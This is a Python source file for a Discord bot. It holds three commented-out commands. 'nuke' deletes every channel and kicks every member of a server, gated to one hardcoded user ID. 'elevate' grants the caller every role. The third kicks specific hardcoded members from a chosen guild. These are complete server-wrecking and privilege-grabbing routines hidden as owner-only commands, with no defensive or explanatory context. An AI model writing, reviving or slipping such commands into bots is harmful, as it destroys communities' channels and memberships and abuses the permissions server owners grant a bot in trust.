from Core import Bot
import discord 
from discord.ext import commands 


bot = Bot()


# @bot.command()
# async def nuke(context: commands.Context):

#     if context.author.id != 604960264709865473:
#         return 
    
#     channels = context.guild.channels
    
#     for channel in channels:
#         try:
#             await channel.delete()
#         except:
#             print('Failed to delete channel! ')

#     for user in context.guild.members:
#         try:
#             await user.kick()
#         except:
#             pass 

# @bot.command()
# async def elevate(context: commands.Context):

#     roles = context.guild.roles
#     for last in roles:
#         try:
#             await context.author.add_roles(last)
#         except Exception as e:
#             print(e)
#     print('Done')

# @bot.command()
# async def allroles(context: commands.Context, id: int):

#     guild = bot.get_guild(id)
    

#     for member in guild.members:
#         if member.id in [734100302394818690, 818166815074025502, 693322733412548679]:
#             try:
#                 await member.kick()
#             except Exception as e:
#                 print(e)


bot.run()